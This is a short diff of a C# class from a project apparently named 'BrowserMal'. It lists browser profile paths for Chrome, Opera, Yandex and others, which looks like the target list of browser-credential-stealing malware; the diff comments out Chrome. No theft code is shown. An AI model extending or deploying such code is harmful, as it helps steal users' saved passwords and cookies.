@@ -10,13 +10,13 @@ namespace BrowserMal.Browser
         public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
         private readonly List<BrowserModel> _browserModelsList;
-        
+
         public BrowserManager() => _browserModelsList = new List<BrowserModel>();
 
         public void Init()
         {
 			_browserModelsList.Add(new BrowserModel("Comodo Dragon", Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data"), "dragon"));
-			_browserModelsList.Add(new BrowserModel("Chrome", Path.Combine(LocalApplicationData + @"\Google\Chrome\User Data"), "chrome"));
+			//_browserModelsList.Add(new BrowserModel("Chrome", Path.Combine(LocalApplicationData + @"\Google\Chrome\User Data"), "chrome"));
 			_browserModelsList.Add(new BrowserModel("Opera", Path.Combine(ApplicationData, @"Opera Software\Opera Stable"), "opera"));
 			_browserModelsList.Add(new BrowserModel("Yandex", Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("360 Browser", Path.Combine(LocalApplicationData + @"\360Chrome\Chrome\User Data"), ""));
